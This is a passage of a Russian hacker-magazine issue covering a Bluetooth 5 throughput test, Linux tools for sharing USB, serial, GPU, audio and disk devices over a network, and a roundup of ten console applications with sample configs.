ТЕСТИРУЕМ ДАЛЬНОСТЬ И ПРОПУСКНУЮ СПОСОБНОСТЬ BLE5
А теперь давай попробуем запустить пример для Bluetooth 5 — тестирование
на дальность и пропускную способ ность.
  Откроем пример по пути
Software Development Kit\nRF5 SDK\nRF5 SDK v14.2.0\examples\ble_‐
central_and_peripheral\experimental\ble_app_att_mtu_throughput
и прошьем этим примером две платы.
  Одна плата будет служить передатчиком, другая будет отве чать на зап‐
росы первой платы.
  Нужно нажать на плате кнопку 4, которая переведет плату в режим ответа.
Обрати внимание — светодиод 1 включен, это ука зывает на то, что плата ска‐
нирует и вещает.
  Нажми кнопку 3 на передатчике, что бы перевести плату в режим передат‐
чика.
  Запусти эмулятор терминала, нап ример Termite или PuTTY (скорость
обмена по COM‐порту нужно установить в 115 200 бит/c), теперь мы можем
видеть, как настроить скорость и сами данные, которые будут отсы латься
и приниматься для двух плат.
  Открой последовательное соединение с COM‐портом, который исполь‐
зуется для платы передатчика (например, COM3). Отобразится командная
строка.
  Введи conﬁg print в терминале, чтобы рас печатать текущую конфигурацию.
  Введи conﬁg в терминале, чтобы нас троить параметры теста. Используй
клавишу Tab для автоматичес кого завершения и для просмотра всех дос‐
тупных команд.
  Набери run в терминале для запуска теста.
  Све тодиод 3 мигает на обеих платах, передатчик печатает в терминал
количество килобайтов, отправленных на UART.
  Све тодиод 4 включается на обеих платах,  когда  тест завершен.
Передатчик печатает про шедшее время, пропускную способность и количес‐
тво байтов, полученных ответчиком.
  Све тодиод 1 включается на ответчике, и все индикаторы отключены
на передат чике, это ука зывает на то, что пла ты отключены. Передатчик
печатает текущую конфигурацию параметров и меню.
   Теперь можно менять параметры и запус кать тест для того, чтобы пос‐
мотреть, как изменяется пропускная способность и дальность для раз ных
наборов параметров.
  Можно, например, менять следующие параметры:


ATT_MTU size  247 bytes // Объем посылки
Connection interval 7.5 ms // Интервал соединения
Data length extension (DLE) ON // Расширение объема данных посылки
PHY data rate 2 Ms/s // Скорость передачи на физическом уровне

Если открыть функцию main это го примера, то можно увидеть, что он мало
чем отличается от примера с миганием светодиода, просто теперь для нас‐
тройки каждого параметра есть своя функция:


gatt_mtu_set(m_test_params.att_mtu); // Объем посылки
data_len_ext_set(m_test_params.data_len_ext_enabled); // Расширение
объема данных посылки
conn_evt_len_ext_set(m_test_params.conn_evt_len_ext_enabled); //
Интервал соединения
preferred_phy_set(&m_test_params.phys); // Скорость передачи на
физическом уровне


ЗАКЛЮЧЕНИЕ
Сегодня мы увидели, что было добавлено в новую спецификацию Bluetooth,
узнали, как этим управлять, освоили новый мощный микроконтрол лер и бес‐
проводную передачу данных. Надеюсь, полученные знания будут тебе полез‐
ны. В следующих выпусках я постара юсь раз вить тему практического при‐
менения BLE5 — например, в настоящем хакерском деле пос троения Mesh‐
сетей.


        WWW

                  •Ин женер фирмы Texas Instruments (TI) объясня‐
                           ет принцип работы Bluetooth 5 и проводит свой
                         знаменитый тест на 1,5 км
                  •Nordic Semiconductor  тестирует особенности
                            Bluetooth 5 в зимний период :)
                    •Начало  работы  с  отладочным  комплектом
                           Nordic
                    •Вебинар, посвящен ный Bluetooth 5 (на англий‐
                          ском)


Музыкаль ная пауза от авто ра
Теперь можно расслабить ся и послушать мою любимую вещь у Кейко
Мацуи — Falcon’s wing (выглядит стремно, я не стал открывать. :) — Прим.
ред.)
UNIXOID
  ЖЕЛЕЗКОЙ
   ПО СЕТИ





 ПРОБРАСЫВАЕМ USB‐
 УСТРОЙСТВА, ВИДЕОКАРТУ,
 ЗВУКОВУХУ И ДИСКИ
                                                                            Илья Остапенко
                                                                                         ostapenko.public@gmail.com НА УДАЛЕННУЮ МАШИНУ





В одной из прошлых статей мы обсужда ли способы подклю‐
чения самых разных сущностей как файлов и каталогов: Web‐
DAV, BitTorrent, SSH и даже память виде оадаптера. Но что,
если мы хотим получить доступ не к уда ленному или локаль‐
ному сервису, а к устройствам удаленной машины? Скажем,
пробросить на локальную машину USB‐порт и использовать
подключенные к нему устройства как локальные.


Особенность Unix‐подоб ной системы — относить ся к любому из своих ком‐
понентов как к файлу — давно уже стала общим местом в разговорах о ее
внутреннем устрой стве. И бесчисленное количес тво статей о том же Linux
тому свидетельство. Обо рудование — не исключение. Видеокарта, аудиокар‐
та, внешний девайс, подключенный через USB, в понимании Linux не что
иное, как файл.
  Оттого удивительно, что из всех операционных систем только Plan 9 (если
не считать пары отпочко вавшихся про ектов со схо жей судьбой), в котором
подобный подход доведен до логического конца, способен без лишних
телодвижений   распозна вать  обо рудование   удаленного   компьютера
и управлять им, как своим собственным.
  В Plan 9 за проб рос оборудования отвечает RPC‐протокол 9P. Он обес‐
печивает доступ вооб ще к любым файлам и устройствам, как локальным, так
и сетевым. К сожалению, Linux похвастать таким универсальным инс трумен‐
том не может. Зато здесь есть нес колько инстру ментов (если не сказать —
костылей), обеспечивающих доступ к оборудованию удаленной машины.


USB
Когда речь заходит о проб росе обо рудования на другой компьютер, воз‐
можно, первое, что приходит на ум, — это веб‐камера на домашнем ноутбуке
или подключенный к нему смартфон, доступ к которым нужно обес печить
с удаленного десктопа. Например, из офи са на дру гом конце города (в дру‐
гом городе, в другой стране).
  В подобном случае выручить может ути лита USB/IP. Развитием утилиты
уже давненько ник то не занимался, но на ее работоспособности это пока
не сказалось — в репозиториях большинс тва популярных дистрибути вов
такой пакет присутствует.
  Первым делом пакет USB/IP следует установить на ту машину, доступ
к устройствам которой необходимо получить извне. Далее загружаем необ‐
ходимые модули:


$ sudo modprobe usbip‐core
$ sudo modprobe usbip‐host

Проверяем, все ли корректно загрузилось:


$ sudo lsmod | grep usbip

И запускаем сервер:


$ sudo usbipd ‐D

Поскольку USB/IP име ет собственную, независимую от встроенной сис тему
адресации, поиск устройств выполняется командой


$ sudo usbip list ‐l

Она покажет список всех устройств, подключенных в данный момент в USB‐
шине.





                    Нас трой ка ути литы USB/IP

Теперь можно приступить непосредс твенно к расшариванию девайса (допус‐
тим, это будет веб‐камера с индексом 2‐3 из полученного списка):


$ sudo usbip bind ‐‐busid=2‐3

Очередная проверка правиль ности выполненных действий:


$ sudo usbip list ‐r localhost

С  исходным  компьютером  покончено.  Далее  следует  настроить  тот,
на котором будет исполь зоваться периферия первого.
   Итак, перейдя на клиентскую машину, устанавливаем на нее USB/IP
и запускаем:


$ sudo modprobe usbip‐core
$ sudo modprobe vhci‐hcd

Проверяем доступность расшаренного оборудования на сервере по списку:


$ sudo usbip ‐‐list АДРЕС_СЕРВЕРА

И присоединяем нашу камеру:


$ sudo usbip ‐‐attach АДРЕС_СЕРВЕРА 2‐3

Проверяем результат:


$ sudo usbip ‐‐port

Теперь удаленное USB‐устройство должно появиться в списке локальных, и с
ним можно будет работать, как с любым другим. Для проверки корректности
подклю чения выпол няем команду lsusb:


$ lsusb


             INFO

                     Существует клиент ская часть USB/IP для Win‐
                       dows. Однако из‐за ошибки в версии протокола
                        в ее исполняемом файле из коробки она работает
                       некорректно. Требуются дополнительные телод‐
                      вижения с подменой кон стант в исходниках.



RS232
Самым лаконичным решением вза имно го рас шаривания в Линуксе могут пох‐
вастаться COM‐пор ты. Никакие дополнительные драйверы для этого не нуж‐
ны. За все отвечает одна малень кая утилита remserial, доступная в исходни‐
ках. Подходит как для доступа из Линукса к оборудованию, подключенному
через RS232 на удаленном компьютере, так и для связки двух девайсов
с COM‐портами, подключенных к раз ным машинам, связанным по сети.
   Расшарить RS232, указав сетевой порт (‐p), ско рость, режим stty (‐s) и имя
порта (здесь /dev/ttyS0), можно так:


$ remserial ‐d ‐p 23000 ‐s "9600 raw" /dev/ttyS0 &

Подключиться к COM‐девайсу, расположенному на удаленной машине (сер‐
вере), — так:


$ remserial ‐d ‐r адрес_сервера ‐p 23000 ‐s "9600 raw" /dev/ttyS0 &

Допустимо запускать несколько экземпляров программы с разными портами
и адресами подключенных девайсов.





                  Компиляция и запуск remserial


ВИДЕОКАРТА
Собираясь расшаривать видеокарту, умес тно задать себе вопрос: зачем
это нужно? Ведь недос татка готовых решений от проприетарщиков нет. Тут
тебе и TeamViewer, совсем недавно порадовавший линуксовым клиентом,
и облачные решения, встраиваемые в браузер. Однако не всегда все так
гладко.
  Видеоподсисте мы современных ноутбуков повсемес тно стали делать гиб‐
ридными, когда на борту присутству ют две видеокарты: первая — мощ ная,
но безголовая — дискретная, которая используется для трудоемких задач
и вклю чается по мере надобности для трансля ции потоков через вторую —
скромную интегрированную, работающую пос тоянно.
  Масштабировав ситуацию до сетевых раз меров и представив себе, что
мощная видеокарта находит ся на уда лен ном компь ютере, а в непосредствен‐
ном доступе пользователя лишь ста ренький нетбук, для которого уже и запуск
современного  браузера  порой  непозволитель ная  роскошь,  при ходишь
к решению, взятому на воору жение все в той же гиб ридной графике. Да еще
и инструментарий тот же — VirtualGL.


             INFO

                     На самом деле все наоборот, и VirtualGL изна‐
                        чально задумывался для сетевых решений, а хинт
                        с гибридами созрел потом.


Пакет  VirtualGL присутству ет в большинс тве популярных дистрибутивов,
поэтому все, что нужно сделать, — это уста новить его штатным менеджером
пакетов на обеих машинах и, в зависимости от того, в какой каталог установ‐
лен пакет, запустить на сервере конфигуратор. В Arch Linux и его про‐
изводных это делается командой


$ sudo vglserver_config ‐config +s +f ‐t

Если в твоей системе пакет уста новлен в /opt, нужно прописать пол ный путь:


$ /opt/VirtualGL/bin/vglserver_config ‐config +s +f ‐t

Далее перезапускай дисплейный менеджер, и сервер можно оставлять
в покое.





                  Работа конфигуратора VirtualGL

На клиентской машине пос ле установки VirtualGL в нем самом ничего кон‐
фигурировать не надо. Здесь нам понадобятся только vglconnect и vglclient.
Зато нужно установить и нас троить SSH. Открываем файл настроек /etc/
ssh/sshd_config и добавляем в него такую строку:


X11Forwarding yes

Перезапускаем сервис sshd. В системах, основанных на systemd, это можно
сделать так:


$ systemctl start sshd

Получить изображение запущенной на сервере прог раммы и тем самым про‐
верить работоспособность связки позволит команда


$ ssh ‐X логин@сервер НАЗВАНИЕ_ПРОГРАММЫ

Теперь можно с помощью vglconnect подклю читься  к серверу, попутно
зашифровав трафик X11 и изоб ражение VGL:


$ vglconnect ‐s логин@сервер

и попробовать запустить какое‐нибудь приложение:


$ vglrun ‐q 40 ‐fps 25 НАЗВАНИЕ_ПРОГРАММЫ

Значения ‐q (степень сжатия JPEG) и ‐fps (час тоту обновления кадров) мож‐
но варьировать, подбирая максимально воз можные на используемом канале
(не резиновом). Сжатие через JPEG при удаленном доступе используется
по умолчанию.
  При желании вернуть систему в исходное состояние поможет команда


$ sudo vglserver_config ‐unconfig


ЗВУКОВАЯ КАРТА
До появления звука в кино оно оставалось немым без малого тридцать лет.
У нас времени чуть меньше, поэто му вслед за видео приступим к проброске
аудио. Здесь все еще про ще, если вос пользовать ся возможностями вез‐
десущего PulseAudio.
  На клиенте и сервере открываем конфигурационный файл ~/.config/
pulse/default.pa или /etc/pulse/default.pa и раскомментируем строку
load‐module module‐native‐protocol‐tcp. На сервере также добавляем
одну из следующих строк:


auth‐ip‐acl=127.0.0.1 # Для доступа клиента с конкретным IP
auth‐anonymous=true   # Для доступа с любого IP

Также на клиенте открываем конфиг ~/.config/pulse/client.conf или /
etc/pulse/client.conf (в зависимости от того, нужно ли установить эти
настройки для одного пользователя или для всех) и добавляем:


default‐server = адрес_сервера

Вместо редактирования client.conf для вывода на удаленный сервер мож‐
но использовать утилиту pax11publish:


$ pax11publish ‐e ‐S адрес_сервера

Отключение вывода на уда ленную машину:


$ pax11publish ‐e ‐r

Чтобы изменения вступили в силу для конкрет ной программы, использующей
PulseAudio, тре буется ее перезапустить.


Аль тер натив ный вари ант
В дебрях интернета в слегка запущен ном виде можно найти проект ауди‐
отрансляции по сети — TRX, основанный на ALSA, кодеке Opus и библиотеке
oRTP. Программа проста в использовании, как авто мат Калашникова, но усту‐
пает ему в безотказнос ти — исходники не обновлялись с 2014 года. Есть
подозрения, что это касается лишь публично дос тупных материалов, пос коль‐
ку основанный на нем онлайн‐сервис аудиооб мена от того же автора Clean‐
feed выглядит достаточно свежо.



ДИСКИ
Для многих термин «рас шаривание» прочно ассоциируется именно с откры‐
тием доступа к дисковым накопителям, их разделам и хранящейся на них
информации. Даже неискушенные пользователи могут похвастаться знанием
слова Samba (и не боятся вбить это слово в поис ковик, чтобы найти краткий
туториал по быстрой настройке, попутно натыка ясь на новос ти об очередной
обнаруженной  уязвимости и мас совых эпидеми ях, вызванных коварной
вирусней).
   Тому, кто привык находить нетривиальные решения, наверняка будет инте‐
ресен вариант экспорта дискового устройства, по спо собу реализации приб‐
лиженный к промышленным стандартам. В рамках воз можнос тей Linux подоб‐
ный экспорт делается при помощи программной системы DRBD, с 2009 года
вошедшей в само ядро. Суть системы отражена в ее названии — распре‐
деленное реплицируемое блочное устройство. Она обеспечивает мгновен‐
ную синхронизацию между локальным и удален ным блочными устройствами.
  Подготовительная работа заключа ется в установке пакета drbd‐utils. Кон‐
фигурировать его можно пошагово с помощью drbdsetup, но проще отредак‐
тировать содержимое файла настро ек /etc/drbd.conf на обеих машинах:


global { usage‐count no; }
common { resync‐rate 100M; }
resource r0 {
  protocol C;
  startup {
    wfc‐timeout  15;
    degr‐wfc‐timeout 60;
  }
  net {
    cram‐hmac‐alg sha1;
    shared‐secret "ПАРОЛЬ";
  }
  on имя_хоста1 {
    device /dev/drbd0;
    disk /dev/sda5;
    address 192.168.0.1:7788;
    meta‐disk internal;
  }
  on имя_хоста2 {
    device /dev/drbd0;
    disk /dev/sda7;
    address 192.168.0.2:7788;
    meta‐disk internal;
  }
}

Опцией cram‐hmac‐alg зада ется алго ритм шифрования, поддерживаемый
на обоих компьюте рах. Они перечислены в файле /proc/crypto. Пароль
shared‐secret может содержать до 64 зна ков.
  Имена хостов определяются командой uname ‐n, запускаемой на каждой
из машин отдельно. Опциям disk присваиваются наз вания дисковых накопи‐
телей или их разделов, относящихся к каждой машине. Следом указываются
IP‐адреса и задействованные порты. Их размер пропорционален размеру
самого устройства.
   Также на обе их машинах запускаем инициализацию хранилища:


$ sudo drbdadm create‐md drbd0

И стартуем демон DRBD:


$ sudo systemctl enable drbd
$ sudo systemctl start drbd

Далее переходим на ту машину, которая будет работать с данными (одновре‐
менный доступ к хранилищу может получить только одна из них), и делаем ее
мастером:


$ sudo drbdadm primary all

Затем создаем и монтируем файловую систему хра нилища:


$ sudo mkfs.ext4 /dev/drbd0
$ sudo mount /dev/drbd0 /mnt

В итоге получился своего рода RAID‐мас сив поверх сети с единовременным
доступом к нему только одного из существу ющих хостов. Впрочем, получить
доступ к данным, находясь на другой машине, также возможно. Для этого
нужно все го лишь размонтировать фай ловую сис тему на текущем мас тере,
сделать мастером вторую машину и смонтировать хранилище на ней. Трех
элементарных команд, одну из которых можно повесить на сочетание клавиш
сразу, а две другие предварительно вставить в сценарий, будет дос таточно.


ВЫВОДЫ
Линукс не идеален и времена ми может серьезно проигры вать дру гим сис‐
темам по своим функциональным возможностям, в точности как в случае
с системой Plan 9 и удаленным доступом к аппа рат ным ресурсам компьюте‐
ра. В то же вре мя, когда воз ника ет пот ребность решить конкретную задачу,
шансы найти подходящий набор инс трументов для этого практически стоп‐
роцентные.
UNIXOID
 ДЕСЯТКА
БЫСТРЫХ





                                         Евгений Зобнин
                                           Редактор Unixoid и Mobile
                                                     zobnin@glc.ru


    ВЫБИРАЕМ КОНСОЛЬНЫЙ СОФТ
      ДЛЯ ПОВСЕДНЕВНЫХ НУЖД





И вновь на страницах нашего журнала рубрика «Кто самый
большой гик на планете». В этот раз мы не будем касаться
темы тюнинга рабочего стола, устанав ливать мозаичные
менеджеры окон и настра ивать автомонтирование. Вместо
этого мы рас скажем об эффектив ности выполнения пов‐
седневных задач, а если точнее — о приложениях, облегча‐
ющих эти задачи.


Если ты перешел на Linux совсем недавно или же работаешь исключительно
в графической среде и графичес ких приложениях, то наверняка задаешься
вопросом: а зачем столько людей используют консольный софт? Я говорю
не о терминале и его мощной командной строке, а о консольных приложениях
с псевдографическим интерфейсом, в которых вся визуальная составля‐
ющая — это символы (яркий пример из мира Windows — FAR и Norton
Commander).
  Скорее все го, ты дума ешь, что пользователи таких приложений — стар‐
перы, которые уже не могут переучиться и привыкнуть к новому. Отчасти
это правда, однако есть и дру гие причины: скорость, удобство и «чистота
интерфейса». Консоль ный софт  прос то  невероятно  быстр, им можно
управлять не используя мышь, а главное — соз дать захламленный псевдогра‐
фический интерфейс прос то невоз можно, он всегда будет содержать только
необходимую информацию, без лишних обвесок и декораций.
  Далее я расскажу о десят ке приложений для решения повседневных
задач: управления файлами, чтения почты, прос лушивания музыки и прочего.
Сразу скажу, что в списке есть нес колько графичес ких приложений (прос мот‐
рщик изображений и PDF‐ридер), но соз даны они с оглядкой на консольный
софт — минималистичный интерфейс и полное управление с клавиатуры. Так
что все будет честно.


ФАЙЛЫ: MIDNIGHT COMMANDER
Midnight Commander (или прос то mc) — одно из самых известных консольных
приложений. Это клон бессмертно го Norton Commander, созданный спе‐
циально для UNIX. Mc мож но увидеть на экра не ноутбука каждого второго
админа, вот только почему‐то все они используют его как есть, выжигая себе
глаза синим фоном.
  На самом деле  Midnight Commander поддерживает темы, выбирать
которые можно из интерфейса или отредактировав .config/mc/config.
Например, чтобы заставить mc использовать не режущую глаза темную тему,
достаточно добавить (изменить) такую строку:


skin=dark

Также рекомендую изменить две другие опции для отключения бес полезных
строки меню сверху и стро ки кно пок сни зу:


keybar_visible=0
menubar_visible=0

Ну а те, кто не любит стандартный редактор mc и пред почитает юзать другой,
должны добавить такую опцию:


use_internal_edit=0

Важная особенность mc — умение показывать и запускать многие типы фай‐
лов с помощью внешних приложений. Например, если ты выберешь файл
с изображением и нажмешь F3, то увидишь на экра не информацию об изоб‐
ражении: формат, размер, глубина цвета и дру гие данные. Эту информацию
mc получает от утилиты identify из пакета ImageMagic. Нажатие Enter запус тит
просмотрщик изоб ражений (по умолчанию с помощью gqview, see или zgv,
какой найдется в системе).
  Все привязки типов файлов к приложениям опи саны в файле ~/.configs/
mc/mc.ext. Он интуитивно понятен, так что при желании конфиг можно изме‐
нить, чтобы заставить mc открывать файлы с помощью удобных тебе при‐
ложений.





                  Midnight Commander здорово го человека


ФАЙЛЫ ПО-ДРУГОМУ: NNN
Двухпанельный файловый менеджер не всегда удобен, когда необходимо
просто пройтись по катало гам и найти/открыть нужный файл. В этом случае
гораздо лучше подойдет nnn — прос той и быс трый как мол ния файловый
менеджер без лишних обвесок и со всей необ ходимой функциональностью
для навигации по файловой системе.
  Nnn представляет файловое дерево в виде спис ка с указанием даты
модификации и размера файлов. Навигация край не простая — стрелки
вверх/вниз для перемещения по списку, вперед/назад для перехода между
каталогами (клавиши h, j, k, l, как в Vim, тоже поддерживаются). Клавиши & и ‐
возвращают к начальному и последнему посещенному каталогу, D откры вает
подробную информацию о файле, Ctrl + R — для переименования.
  В nnn есть система поис ка в реальном времени, вызываемая по клавише
/, и система закладок. Просто нажми b в нужном каталоге, введи имя зак‐
ладки и возвращайся к нему когда вздумается с помощью Ctrl + V.





                   Лаконичный интерфейс nnn


ЭЛЕКТРОННАЯ ПОЧТА: MUTT
В среде пользователей UNIX почтовый клиент mutt занимает примерно то же
место, что и Vim: его либо ненавидят, либо не могут без него жить. Как и
у Vim, у mutt очень высокий порог вхождения, его нельзя просто запустить
и начать использовать. Точнее, можно, но всей мощи клиента ты не увидишь.
mutt необходимо конфигурировать, долго подс тра ивая его под себя. Зато
в результате ты получишь приложение, с помощью которого можно обра‐
ботать тонны писем намного быс трее, чем с помощью любого другого кли‐
ента.
   Рассказывать здесь о том, как конфигурировать mutt, бессмысленно,
это слишком обширная тема. Зато в Сети всег да можно найти множество
преднастроенных конфигов, один из которых обязательно тебе подойдет
(пример для любителей Vim). Существу ют даже он лайн‐генераторы кон фига
mutt.
   Вот лишь базовый конфиг mutt для подключения к Gmail (имей в виду, тебе
необходимо включить поддержку IMAP и создать пароль при ложе ния спе‐
циально для mutt, если ты используешь двухфакторную аутентификацию):


# Имя отправителя и сортировка от конца к началу
set realname = "Jay Z"
set use_from = yes
set sort = reverse‐threads
set sort_aux = last‐date‐received
# Настройки IMAP/SMTP
set from = zobnin@gmail.com
set imap_user = zobnin@gmail.com
set imap_pass = password
set smtp_url = smtp://yourmail@smtp.gmail.com:587/
set smtp_pass = password
set folder = imaps://imap.gmail.com:993
set spoolfile = +INBOX #or +[Gmail]/Important
set postponed = +[Gmail]/Drafts
set header_cache = ~/.mutt/cache/headers
set message_cachedir = ~/.mutt/cache/bodies
set certificate_file = ~/.mutt/certificates





                        mutt: прос тота и эффективность


ПОЧТА GMAIL: VMAIL
Пользователи mutt делятся на две группы: те, кто не осилил почтовый клиент
и ушел на более привычный и дру желюбный к поль зователю, и те, кто остался
с mutt нав сегда. Среди пос ледних в основном ока зываются люди, хорошо
знакомые с Vim и Emacs, поэто му даже в mutt они используют похожие хоткеи.
Так почему бы просто не написать пла гин для Vim или Emacs и не исполь‐
зовать редактор в качестве почтового клиента?
  Именно так поступил автор Vmail, почтового клиента, который интегри‐
руется с Vim. Vmail поддерживает исключитель но Gmail, зато он прос то
работает. Единственное, что тебе придется сделать, — установить Vmail:


$ gem install vmail

Добавить свои логин и пароль в конфиг ~/.vmailrc:


username: zobnin@gmail.com
password: myverydifficultpass
name: Evgeny Zobnin

И запустить клиент. Откро ется Vim, и на экране появится список писем.
Выбираем письмо стрелочками, нажимаем Enter, в нижней части появляется
текст письма. Нажимаем еще раз — возвращаемся обратно. Можно удалять
письма (,#), помечать звез дочкой (,\*) и выполнять другие операции. Vmail
имеет развитую систему поиска, поддержи вает открытие ссы лок в браузере,
скачивание вложений и практически все функции, которые только могут
понадобиться. А самое главное — это Vim, а зна чит, при написании писем ты
будешь чувствовать себя в своей тарелке (если ты, конечно, поклонник Vim).





                         Vmail: читаем почту в редакторе


МУЗЫКА: MOC
Среди плееров для Linux трудно найти тот, что сравнялся бы по удобству
использования с MOC. Это простой консольный плеер, выпол ненный в стиле
двухпанельного файлового менеджера (похоже, это бессмертная идея).
С левой  стороны находится менеджер фай лов, с правой — текущий
плей‐лист. Ты просто добавляешь нужные файлы в плей‐лист с помощью кла‐
виши a либо добавляешь весь каталог с помощью Shift + a (M3U‐плейлис‐
ты также поддерживаются). Shift + c очищает плей‐лист. Предельно прос‐
тое, понятное и эффективное управление.
  Простота исполь зования — далеко не единственное преимущество MOC.
Этот плеер имеет клиент‐серверную архи тек туру, а это значит, что пос ле
вклю чения проигрывания ты можешь нажать на q, чтобы закрыть интерфейс.
Музыка будет играть в фоне, и ты даже сможешь ее контролировать из коман‐
дной строки:


$ mocp ‐s # Остановить воспроизведение
$ mocp ‐p # Запустить воспроизведение
$ mocp ‐f # Следующий трек
$ mocp ‐r # Предыдущий трек

Эти команды можно повесить на хоткеи рабочего стола или использовать
совместно с dmenu. Еще один вариант: икон ка в трее.
   Как и mc, MOC по умол чанию синий, так что придется править конфиг
(заодно добавим поддержку русского для MP3‐фай лов, содержащих устарев‐
шие ID3‐теги). Копируем дефолтовый конфиг:


$ cp /usr/share/doc/moc/config.example ~/.moc/config

Добавляем в него две опции:


Theme = darkdot_theme
ID3v1TagsEncoding = WINDOWS‐1251





             MOC: музыка в стиле Norton Commander


ВИДЕО: MPV
Во времена палеолита, когда компьютеры были большими и мед ленны ми,
существовал плеер, который был спо собен проигры вать MPEG4‐видео
на Pentium 166. Назывался он MPlayer, а его автором был Арпад Герёффи (Ár‐
pád Gereöﬀy). После Арпад отстранился от разработки, и MPlayer начал стаг‐
нировать. Сначала на свет появился форк MPlayer 2, а затем mpv.
  Ключевая особен ность mpv — всеядность. Ему можно скормить буквально
все: видео в любых форматах и раз решениях, видеопотоки, аудио и аудиопо‐
токи, изображение с веб‐камеры. Там, где VLC споткнется и упадет, mpv спо‐
койно продолжит проигрывание. И даже извечная проблема Linux с хардвар‐
ным ускорением ему не помеха; он без вся ких проблем перекладывает
декодирование на пле чи видеокарты, скромно сооб щая, что в этом режиме
видеофильтры работать не будут.
  Mpv будет весьма удобен для тех, кто не боится консоли и управления
с клавиатуры. Просто запусти его, ука зав нужный файл в качестве аргумента,
а затем управляй воспроизведением с помощью клавиш влево, вправо, PgUp,
PgDown, пробел. Если же тебе удоб нее рулить мышкой (например, если ты
хочешь смотреть видео на Raspberry Pi), есть прекрасная графическая обер‐
тка — SMPlayer.





  Mpv настолько всеяден, что ты даже можешь скормить ему каталог
  с музыкой и он сам достанет из него плей‐лист и даже покажет на экране
  обложку альбома


ИЗОБРАЖЕНИЯ: FEH
Каким должен быть интерфейс по‐настояще му гиковского просмотрщика
изображений? Правильно, его не должно быть. Feh — крайне простой,
но очень быстрый прос мот рщик. Прос то укажи в качестве аргу ментов име на
файлов, и он выведет их на экран. По умолчанию feh показы вает изображения
«пиксель в пиксель», это зна чит, что они не будут масштабированы до раз‐
меров экрана/окна. Что бы это го избежать, можно использовать флаг ‐F. Так‐
же в качестве аргумента можно передать URL для просмотра изображения
без скачивания.
   Feh уме ет отоб ражать контекс тное меню, но управлять им удобнее
с помощью клавиатуры. Наиболее полезные комбинации:
 • влево/вправо — предыду щее/следующее изоб ражение;
 • вверх/вниз — изменение масшта ба;
 • / — подогнать под размер окна;
 • A — включить/выключить сглаживание;
 • d — показать имя файла и номер фай ла, если их несколько;
 • e — показать тег EXIF;
 • v — полноэкранный режим.

Feh умеет формировать коллажи (флаги ‐c, ‐m и ‐i) и позволяет устанав‐
ливать изображение в качес тве обоев рабочего стола:


$ feh ‐‐bg‐scale /путь/до/файла





                     Feh: прос мот рщик без интерфей са


             INFO

                   Немногие знают, но просматривать изображения
                   можно даже в голой консоли, без запуска гра‐
                     фической среды. Просмотрщик Fim умеет исполь‐
                        зовать  fbdev для вывода картинки в консоль
                      и даже позволяет просматривать изоб ражения
                        в ASCII art.



PDF: ZATHURA
В 2005 году Тор Андерсон (Tor Andersson) выпустил библиотеку MuPDF,
которая показывала просто потрясающие результаты скорос ти рендеринга
PDF‐документов. Вместе с библиотекой поставлял ся прос тейший просмот‐
рщик, с помощью которого можно было оценить скорость работы библиотеки
или быстро открыть простень кий документ.
  Сегодня MuPDF продол жает развивать ся, а прос мотрщик до сих пор вхо‐
дит в ее состав. Он невероятно быстр и в целом удобен, но не умеет запоми‐
нать позицию чтения и не имеет удоб ной системы навигации. Зато все эти
возможности есть в просмотрщике Zathura, для которого доступен плагин
MuPDF (пакет zathura‐pdf‐mupdf).
   Zathura — истинно гиковское приложение, внешне простое, но с большим
арсеналом функций. Интерфейса здесь как такового нет, точнее, он есть,
но напоминает интерфейс редактора Vim — панель сос тояния внизу экрана,
плюс строка команд, вызываемая по нажатию :. Управле ние пол ностью кла‐
виатурное с хот кеями в стиле того же Vim: клавиши h, j, k, l или стрелки
для навигации по документу, J и K для переключения между страницами, a
и s, чтобы вместить страницу в окно по высоте или ширине, d включает режим
отображения страниц в виде раз ворота, Tab откры вает оглавление. Чтобы
увидеть подсказку по командам, дос таточно открыть строку команд и нажать
Tab.
  Кроме PDF, zathura поддерживает форматы DjVu, PostScript и ComicBook,
но для их просмотра необходимо установить дополнительные плагины:
 • zathura‐djvu;
 • zathura‐ps;
 • zathura‐cb.





                       Zathura и меню автодополнения


БРАУЗЕР: ELINKS
Держу пари, что ELinks — один из самых странных браузеров из всех, что ты
когда‐либо видел. И дело вовсе не в его функци ональности, а в том, что
это консольный браузер, который не умеет отображать картинки, но, как ни
странно, поддерживает веб‐формы, CSS, кукисы, JavaScript, вкладки, IPv6,
парал лельную загрузку файлов и скриптование. Сайты в нем выглядят почти
неюзабельно, а о веб‐приложениях можно  забыть, зато он  загружает
веб‐страницу быстрее, чем ты ска жешь слово «заг рузить».
   ELinks не повседневный браузер, но это отличное средс тво для быстрого
открытия  докумен тов  или  проверки  сайтов  на  доступность.  Также
это отличный браузер для конфиденциального серфинга Сети: многие
методы трекинга в нем прос то не работают, а та же поддержка JS этому бра‐
узеру не особо и нужна (читай: ее можно смело отклю чить).
   У ELinks есть прародитель под названием Links. Это менее функциональ‐
ный браузер с одной очень интерес ной особенностью: он умеет работать
в графическом режиме, используя при этом тот же движок, что и для рен‐
деринга в терминале. В результате браузер отрисовывает страницу быстрее,
чем любой другой графический браузер на пла нете. К тому же может делать
это в голой консоли (да, графичес кий режим в голой консоли с исполь‐
зованием того же fbdev, что и Fim).





                         Xakep.ru в бра узере ELinks


ТОРРЕНТЫ: RTORRENT
rTorrent — один из самых быстрых торрент‐клиентов. При получении и отдаче
данных rTorrent не записывает/читает файлы обычными методами, как это
делают другие клиенты, а отобража ет файл в оперативную память с помощью
mmap() и напрямую копиру ет данные из памяти сетевого сте ка в «память
файла». На быстрых соединениях такой механизм поз воляет достичь намного
большей производительности работы приложения.
  Однако известность rTorrent получил по дру гой при чине — это практичес ки
идеальный вариант для домашнего сервера. Можно запус тить клиент внутри
screen или tmux и подключать ся к нему по SSH вместо использования громоз‐
дких веб‐интерфейсов.
   Как и любое консоль ное приложение, rTorrent не имеет никаких средств
конфигурирования, и для его настройки необ ходимо править файл ~/.rtor‐
rent.rc. Автор предлага ет хороший начальный конфиг, который можно ска‐
чать с помощью такой команды:


$ curl ‐Ls "https://raw.githubusercontent.com/wiki/rakshasa/rtorrent/
CONFIG‐Template.md" | grep ‐A9999 '^######' | grep ‐B9999 '^### END'
| sed ‐re "s:/home/USERNAME:$HOME:" >~/.rtorrent.rc

Стандартный каталог rTorrent — ~/rtorrent. В нем есть два подкаталога:
watch и log, во второй клиент сливает свои логи, первый служит для авто‐
добавления торрентов. Просто ско пируй torrent‐файл в ~/rtorrent/watch/
start, и он автоматически попадет в очередь. Копирование в ~/rtorrent/
watch/load загрузит торрент в клиент, но не добавит в очередь скачивания.
Каталог загрузки файлов: ~/rtorrent/download.
